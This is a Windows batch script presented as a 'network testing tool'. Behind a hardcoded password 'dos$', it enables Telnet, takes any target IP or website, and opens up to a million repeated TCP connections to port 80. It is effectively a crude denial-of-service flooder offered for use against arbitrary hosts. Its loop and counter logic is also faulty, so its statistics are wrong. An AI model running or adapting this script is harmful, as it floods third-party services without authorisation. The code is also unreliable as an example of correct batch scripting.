@echo off
setlocal

REM ==============================================
REM MPS VMini - Network Testing Tool
REM ==============================================

REM ASCII Art Title: MPS
echo.
echo.
echo.      __  __ ____  ____  
echo.     |  \/  |  _ \/ ___| 
echo.     | |\/| | |_) \___ \ 
echo.     | |  | |  __/ ___) |
echo.     |_|  |_|_|   |____/ 
echo.
echo.

REM ==============================================
REM Password Protection
REM ==============================================

set "password=dos$"
set /p userpass=Enter the password to continue: 
if not "%userpass%"=="%password%" (
    echo Incorrect password. Exiting...
    pause
    exit /b
)

REM ==============================================
REM Check if Telnet is installed
REM ==============================================

where telnet >nul 2>&1
if %errorlevel% equ 0 (
    goto StartScript
) else (
    echo Telnet is not installed.
    echo.
    echo Enabling Telnet Client via DISM...
    REM Run DISM to enable Telnet Client
    dism /online /Enable-Feature /FeatureName:TelnetClient /NoRestart
    if %errorlevel% equ 0 (
        echo Telnet Client has been enabled successfully.
        goto StartScript
    ) else (
        echo Failed to enable Telnet Client. Please run this script as Administrator.
        pause
        exit /b
    )
)

:StartScript
REM ==============================================
REM Prompt User for Target IP or Website
REM ==============================================

set /p target=Enter the target IP or website: 
if "%target%"=="" (
    echo No target specified. Exiting...
    pause
    exit /b
)

REM Set the number of connections to make
set /p packets=Enter the number of connections to make (default is 1000, max is 1000000): 
if "%packets%"=="" set packets=1000
if %packets% gtr 1000000 set packets=1000000

REM ==============================================
REM Initialize Stats
REM ==============================================

set "statsFile=%temp%\stats.txt"
echo Connection Stats > "%statsFile%"
echo ----------------- >> "%statsFile%"
echo Packets Sent: 0 >> "%statsFile%"
echo Data Sent: 0 MB (0 GB) >> "%statsFile%"
start notepad "%statsFile%"

REM ==============================================
REM Make TCP Connections Using Telnet
REM ==============================================

echo Starting %packets% TCP connections to %target%...
echo Press Ctrl+C to stop at any time.

set /a packetCount=0
set /a dataSent=0

REM Outer loop for thousands
for /L %%a in (1,1,%packets:~0,-3%) do (
    REM Inner loop for hundreds
    for /L %%b in (1,1,1000) do (
        echo quit | telnet %target% 80 >nul
        if %errorlevel% equ 0 (
            echo Successfully connected to %target% (Connection %%a-%%b)
        ) else (
            echo Failed to connect to %target% (Connection %%a-%%b)
        )
        set /a packetCount+=1
        set /a dataSent+=64  REM Assuming 64 bytes per packet
        set /a dataSentMB=dataSent/1048576
        set /a dataSentGB=dataSent/1073741824
        echo Packets Sent: %packetCount% > "%statsFile%"
        echo Data Sent: %dataSentMB% MB (%dataSentGB% GB) >> "%statsFile%"
    )
)

echo All TCP connections attempted!
pause
